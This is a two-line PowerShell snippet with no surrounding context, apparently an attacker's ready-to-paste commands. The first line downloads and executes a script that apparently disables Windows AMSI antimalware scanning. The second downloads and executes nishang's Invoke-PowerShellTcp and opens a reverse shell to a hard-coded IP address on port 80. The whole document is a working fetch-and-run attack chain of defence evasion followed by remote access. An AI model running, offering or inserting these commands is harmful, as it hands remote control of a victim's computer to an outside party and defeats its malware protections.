iex (iwr -uri https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1 -useb)
iex (iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -useb);Invoke-PowerShellTcp -Reverse -IPAddress 3.29.121.76 -Port 80
